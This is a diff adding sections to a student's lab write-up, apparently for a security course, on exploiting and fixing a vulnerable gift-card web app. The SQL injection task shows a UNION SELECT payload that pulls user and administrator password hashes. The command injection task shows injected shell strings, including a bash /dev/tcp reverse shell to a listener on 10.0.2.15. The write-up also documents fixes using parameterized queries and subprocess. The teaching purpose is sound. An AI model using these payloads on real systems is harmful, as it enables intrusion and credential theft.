@@ -76,3 +76,69 @@ This is not a foolproof method of checking for the vulnerability as the script j
 ## Task 3: Structured Query Language Injection (SQLi)
 
 ### Task 3a
+In this task we need to perform an SQL injection attack on the website by using a vulnerable page. We are required to find the password hash for the target and administrator to prove this vulnerability.
+We have a page called ```Buy a Card``` where we can buy a giftcard which in turn downloads a json file. We can then use this gift card in the ```Use a Card``` page by uploading this json file. In this process we look for a vulnerability in the json file that we are uploading and we can see that there is an SQL injection vulnerability in the ```signature``` field of the json file.
+Now to find the password hash of the ```target(hitha)``` we use the SQL query ```UNION SELECT password FROM LegacySite_user where username = 'hitha';--``` in the signature field. We then upload the json file to the Use a Card page which redirects us to an error page that contains the hash os the password. The ```hr2340-sqli.gftcrd``` file and the error page are shown in the screenshot below where the password hash is highlighted.
+![task3a-1](Artifacts/task3a_1.png)
+
+
+To find the administrator password hash we use the SQL query ```UNION SELECT password FROM LegacySite_user where username = 'administrator';--``` and follow the same steps to produce the error page. The output is shown in the screenshot below along with the ```.gftcrd``` file.
+![task3a-2](Artifacts/task3a_2.png)
+
+
+### Task 3b
+In this task we need to write a python script to check for the SQLi vulnerability in the website. This is in the ```hr2340-sqli.py``` file. The script performs a login using the username, password and csrf token to the login.html page. Then we send another post request to useCard page using the json file we got and modified in task 3a. We then check for the administrator password hash in the request response. If it is present we can say that the website is ```Vulnerable to SQLi!```. The script and the output are shown below.
+![task3b](Artifacts/task3b.png)
+
+
+### Task 3c
+In this task we need to fix the vulnerability by making changes to the source code. The code that takes the signature and inputs it to the SQL query is present in the ```views.py``` file. We can mitigate the vulnerability by passing the signature as a parameter that takes only strings as the signature input and not SQL queries. This change is done in the line 199 in the code shown below.
+![task3c-1](Artifacts/task3c_1.png)
+
+
+Now we try to attack the website like we did in task 3a. We upload the ```.gtfcrd``` in the Use a Card page and we can see that we are not redirected to an error page, instead we can get a message ```Card Used!``` on the screen. The screenshot below shows this.
+![task3c-2](Artifacts/task3c_2.png)
+
+
+### Task 3d
+In this task we need to prove that the vulnerability is not present using the python script we wrote in task 3b. After we make the source code changes, we run the ```hr2340-sqli.py``` script and we see that the website is ```Not Vulnerable to SQLi!```. This is shown in the screenshot below.
+![task3d](Artifacts/task3d.png)
+
+
+## Task 4: Command Injection (CMDi)
+
+### Task 4a
+In this task we need to find a Command line injection vulnerability. When we look at the file ```extras.py``` we can find the line ```ret_val = system(f"./{CARD_PARSER} 2 {card_path_name} > tmp_file")``` that looks like a good vulnerability that could be exploited. Then using the code in ```views.py``` we can see that after we submit the json file in Use a Card page, it calls a function from extras.py to parse the card details. In the extras.py file we can see that if there is an error in the json file then it continues the code execution to reach the vulnerable line in the code. So we buy a card and change the json file by removing ```"{"``` and we name the file ```hr2340-cmdi.gftcrd```. The code snippets are shown below.
+![task4a-1](Artifacts/task4a_1.png)
+
+
+Now we use this card by uploading the hr2340-cmdi.gftcrd file and in the ```name field``` we give an attack string such as ```Name; ls -la ;Name```. This is shown in the screenshot below.
+![task4a-2](Artifacts/task4a_2.png)
+
+
+After submitting this we can see an error page for json decode error and in the terminal we can see the execution of the attack string command. This is shown below.
+![task4a-3](Artifacts/task4a_3.png)
+
+
+Now we can perform a higher order attack of opening a reverse shell and executing shell commands by creating a listener in the terminal. First we create the listener using the command ```nc -nv -l 7070```. Then we use the gift card by uploading the json file and naming it with an attack string as ```Name; bash -c "/bin/bash -i > /dev/tcp/10.0.2.15/7070 0<&1 2>&1" ;Name```. Then after submitting we can see the json decode error and in the terminal a reverse shell is opened and we can execute shell commands like ```hostname; date; id;```. This is shown below.
+![task4a-4](Artifacts/task4a_4.png)
+
+
+### Task 4b
+In this task we need to write a python script that will check for the CMDi vulnerability. For this we write a python script ```hr2340-cmdi.py``` where we perform a login and then using socket() we set a listener. Then we do a post request to the Use a Card page where we pass the card, and the card name as the attack string ```Name; /bin/bash -c \"echo hr2340 > /dev/tcp/127.0.0.1/6060\" ;Name```. Then we check for the response, if it contains the string ```hr2340```, then it is proved that the website is ```Vulnerable to CMDi!```
+![task4b](Artifacts/task4b.png)
+
+
+### Task 4c
+In this task we need to mitigate the vulnerability by making source code changes. In the ```extras.py``` file we can use the subprocess library instead of the system call. This will consider the user input as arguments and hence it will not execute a shell script through the command. As there is no system call to the shell, we will not be able to use it to send the content to the tmp_file, instead we need to write the output of the command execution to the tmp_file. In the source code, lines 61 to 68 have been added to address this issue. The code snippet is shown below.
+![task4c](Artifacts/task4c.png)
+
+
+### Task 4d
+In this task we need to show that the vulnerability is mitigated with the help of the python script we wrote in task 4b. In order to do that we need to make a few changes of setting the timeout and checking for it. If there is a timeout it should show ```Not Vulnerable to CMDi!```. This is shown in the screenshot below.
+![task4d](Artifacts/task4d.png)
+
+
+# Part 2: Automated Regression & Database Encryption
+
+## Task 5 (10pts): Continuous Integration and Development
